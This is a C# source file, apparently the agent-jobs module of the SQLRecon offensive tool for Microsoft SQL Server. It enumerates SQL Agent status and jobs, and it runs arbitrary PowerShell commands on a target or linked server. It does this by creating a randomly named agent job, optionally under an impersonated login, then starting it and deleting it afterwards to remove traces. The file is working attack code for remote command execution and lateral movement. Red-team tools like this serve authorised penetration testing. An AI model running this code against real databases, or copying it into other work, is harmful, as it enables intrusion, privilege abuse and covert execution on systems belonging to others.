using System;
using System.Data.SqlClient;
using System.IO;
using System.Security.Cryptography;

namespace SQLRecon.Modules
{
    public class AgentJobs
    {
        SQLQuery sqlQuery = new SQLQuery();

        public void AgentStatus(SqlConnection con, String sqlServer, String impersonate = "null")
        {
            string sqlOutput = "";

            if (!impersonate.Equals("null"))
            {
                sqlOutput = CheckAgent(con, sqlServer, impersonate);
            }
            else
            {
                sqlOutput = CheckAgent(con, sqlServer);
            }

            if (sqlOutput.Contains("1"))
            {
                Console.Out.WriteLine("\n[+] SQL agent is running on: " + sqlServer);

                if (!impersonate.Equals("null"))
                {
                    Console.WriteLine(Jobs(con, sqlServer, impersonate));
                }
                else
                {
                    Console.WriteLine(Jobs(con, sqlServer));
                }
            }
            else
            {
                Console.Out.WriteLine("\n" + sqlOutput);
            }
        }

        public void LinkedAgentStatus(SqlConnection con, String sqlServer, String linkedSqlServer)
        {
            string sqlOutput = LinkedCheckAgent(con, linkedSqlServer);

            if (sqlOutput.ToLower().Contains("1"))
            {
                Console.Out.WriteLine("\n[+] SQL agent is running on: " + linkedSqlServer);
                Console.WriteLine(LinkedJobs(con, linkedSqlServer));
            }
            else
            {
                Console.Out.WriteLine("\n" + sqlOutput);
            }
        }

        public string Jobs(SqlConnection con, String sqlServer, String impersonate = "null")
        {
            string sqlOutput = "";

            if (!impersonate.Equals("null"))
            {
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT job_id, name, enabled, date_created, date_modified FROM msdb.dbo.sysjobs ORDER BY date_created");
            }
            else
            {
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "SELECT job_id, name, enabled, date_created, date_modified FROM msdb.dbo.sysjobs ORDER BY date_created");
            }

            if (sqlOutput.ToLower().Contains("job_id"))
            {
                return "\n[+] Agent Jobs:" + sqlOutput;
            }
            else if (sqlOutput.ToLower().Contains("permission"))
            {
                return "\n[!] ERROR: The current user does not have permissions to view agent information";
            }
            else
            {
                return "\n[+] There are no jobs on: " + sqlServer;
            }
        }

        public string LinkedJobs(SqlConnection con, String linkedSqlServer)
        {
            string sqlOutput = sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "SELECT job_id, name, enabled, date_created, date_modified FROM msdb.dbo.sysjobs ORDER BY date_created");

            if (sqlOutput.ToLower().Contains("job_id"))
            {
                return "\n[+] Agent Jobs: " + linkedSqlServer + "\n" + sqlOutput;
            }
            else if (sqlOutput.ToLower().Contains("permission"))
            {
                return "\n[!] ERROR: The current user does not have permissions to view agent information";
            }
            else
            {
                return "\n[+] There are no jobs on: " + linkedSqlServer;
            }
        }

        public string CheckAgent(SqlConnection con, String sqlServer, String impersonate = "null")
        {
            string sqlOutput = "";

            if (!impersonate.Equals("null"))
            {
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE dss.[servicename] LIKE 'SQL Server Agent (%';");
            }
            else
            {
                sqlOutput = sqlQuery.ExecuteCustomQuery(con, "SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE dss.[servicename] LIKE 'SQL Server Agent (%';");
            }

            if (sqlOutput.ToLower().Contains("running"))
            {
                return "1";
            }
            else if (sqlOutput.ToLower().Contains("permission"))
            {
                return "\n[!] ERROR: The current user does not have permissions to view agent information";
            }
            else
            {
                return "\n[+] SQL agent is not running on: " + sqlServer;
            }
        }

        public string LinkedCheckAgent(SqlConnection con, String linkedSqlServer)
        {
            string sqlOutput = sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE dss.[servicename] LIKE ''SQL Server Agent (%'';");

            if (sqlOutput.ToLower().Contains("running"))
            {
                return "1";
            }
            else if (sqlOutput.ToLower().Contains("permission"))
            {
                return "\n[!] ERROR: The current user does not have permissions to view agent information";
            }
            else
            {
                return "\n[+] SQL agent is not running on: " + linkedSqlServer;
            }
        }

        public void AgentCommand(SqlConnection con, string sqlServer, String cmd)
        {
            string sqlOutput = "";

            // first check to see if agent is running
            sqlOutput = CheckAgent(con, sqlServer);

            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: The SQL Agent is not running");
                return;
            }

            RandomString rs = new RandomString();
            string jobName = rs.Generate(8); // generate a new random output name
            string stepName = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting job_name to: " + jobName);
            Console.WriteLine("\n[+] Setting step_name to: " + stepName);


            sqlOutput = sqlQuery.ExecuteQuery(con, "use msdb;" +
                "EXEC dbo.sp_add_job @job_name = '" + jobName + "';" +
                "EXEC sp_add_jobstep @job_name = '" + jobName + "', " +
                "@step_name = '" + stepName + "', " +
                "@subsystem = 'PowerShell', " +
                "@command = '" + cmd + "', " +
                "@retry_attempts = 1, " +
                "@retry_interval = 5;" +
                "EXEC dbo.sp_add_jobserver @job_name = '" + jobName + "';");

            sqlOutput = Jobs(con, sqlServer);

            if (sqlOutput.ToLower().Contains(jobName.ToLower()))
            {
                Console.WriteLine("\n[+] Executing Job and waiting for 5 seconds ...");
                sqlOutput = sqlQuery.ExecuteQuery(con, "use msdb;" +
                    "EXEC dbo.sp_start_job '" + jobName + "'; " +
                    "WAITFOR DELAY '00:00:05';");

                Console.WriteLine("\nSUCCESS: Deleting job");

                sqlQuery.ExecuteQuery(con, "use msdb;" +
                    "EXEC dbo.sp_delete_job  @job_name = '" + jobName + "';");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to create new jobs");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to create new job");
            }
        }

        public void ImpersonateAgentCommand(SqlConnection con, string sqlServer, String cmd, String impersonate)
        {
            string sqlOutput = "";

            // first check to see if agent is running
            sqlOutput = CheckAgent(con, sqlServer, impersonate);

            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: The SQL Agent is not running");
                return;
            }

            RandomString rs = new RandomString();
            string jobName = rs.Generate(8); // generate a new random output name
            string stepName = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting job_name to: " + jobName);
            Console.WriteLine("\n[+] Setting step_name to: " + stepName);

            sqlOutput = sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';" +
                "use msdb;" +
                "EXEC dbo.sp_add_job @job_name = '" + jobName + "';" +
                "EXEC sp_add_jobstep @job_name = '" + jobName + "', " +
                "@step_name = '" + stepName + "', " +
                "@subsystem = 'PowerShell', " +
                "@command = '" + cmd + "', " +
                "@retry_attempts = 1, " +
                "@retry_interval = 5;" +
                "EXEC dbo.sp_add_jobserver @job_name = '" + jobName + "';");

            sqlOutput = Jobs(con, sqlServer, impersonate);

            if (sqlOutput.ToLower().Contains(jobName.ToLower()))
            {
                Console.WriteLine("\n[+] Executing Job and waiting for 5 seconds ...");
                sqlOutput = sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; " +
                    "use msdb;" +
                    "EXEC dbo.sp_start_job '" + jobName + "';" +
                    " WAITFOR DELAY '00:00:05';");

                Console.WriteLine("\nSUCCESS: Deleting job");

                sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; " +
                    "use msdb; " +
                    "EXEC dbo.sp_delete_job  @job_name = '" + jobName + "';");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to create new jobs");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to create new job");
            }
        }

        public void LinkedAgentCommand(SqlConnection con, string linkedSqlServer, String cmd)
        {
            string sqlOutput = "";

            // first check to see if agent is running
            sqlOutput = LinkedCheckAgent(con, linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: The SQL Agent is not running on the linked server");
                return;
            }

            RandomString rs = new RandomString();
            string jobName = rs.Generate(8); // generate a new random output name
            string stepName = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting job_name to: " + jobName);
            Console.WriteLine("\n[+] Setting step_name to: " + stepName);

            sqlOutput = sqlQuery.ExecuteLinkedQueryWithSideEffects(con, linkedSqlServer, "use msdb;" +
                "EXEC dbo.sp_add_job @job_name = ''" + jobName + "'';" +
                "EXEC dbo.sp_add_jobstep @job_name = ''" + jobName + "'', " +
                "@step_name = ''" + stepName + "'', " +
                "@subsystem = ''PowerShell'', " +
                "@command = ''" + cmd + "'', " +
                "@retry_attempts = 1, " +
                "@retry_interval = 5;" +
                "EXEC dbo.sp_add_jobserver @job_name = ''" + jobName + "'';");
            
            sqlOutput = LinkedJobs(con, linkedSqlServer);

            
            if (sqlOutput.ToLower().Contains(jobName.ToLower()))
            {
                Console.WriteLine("\n[+] Executing Job and waiting for 5 seconds ...");
                sqlOutput = sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "use msdb;" +
                    "EXEC dbo.sp_start_job ''" + jobName + "''; " +
                    "WAITFOR DELAY ''00:00:05'';");

                Console.WriteLine("\nSUCCESS: Deleting job");

                sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "use msdb;" +
                    "EXEC dbo.sp_delete_job  @job_name = ''" + jobName + "'';");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to create new jobs");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to create new job");

            }
        }

    }
}